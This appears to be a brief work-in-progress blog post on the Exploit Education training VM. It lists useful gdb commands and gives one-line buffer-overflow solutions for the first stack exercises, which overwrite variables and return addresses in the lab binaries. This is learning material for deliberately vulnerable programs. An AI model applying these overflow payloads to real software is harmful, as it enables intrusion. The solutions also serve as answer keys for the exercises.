Exploit Eduction is a great place to begin your journey in reverse engineering. In essence the site provides you with a `qcow2` image that you fire up using `qemu` and then `ssh` into a training machine.

This is a work in progess, I've just listed for now some useful `gdb` commands, links and the solutions to the first 4 stack exercises.

```bash
gdb
set disassembly-flavor intel
info functions
disas <funct>
break main
run
info proc map
x/s 0x00000000
x/x $rax
set [Address/Register]=[Hex Data]
attach pid
```

```

```bash
ssh -p2222 user@localhost
python -c 'print "A"*65' | ./stack-zero
./stack-one $(python -c 'print "A"*64 + "\x62\x59\x6c\x49"')
export ExploitEducation=$(python -c 'print "A"*64 + "\x0a\x09\x0a\x0d"') && ./stack-two
python -c 'print "A"*64 + "\x9d\x06\x40"' | ./stack-three
python -c 'print "A"*88 + "\x1d\x06\x40"' | ./stack-four
```
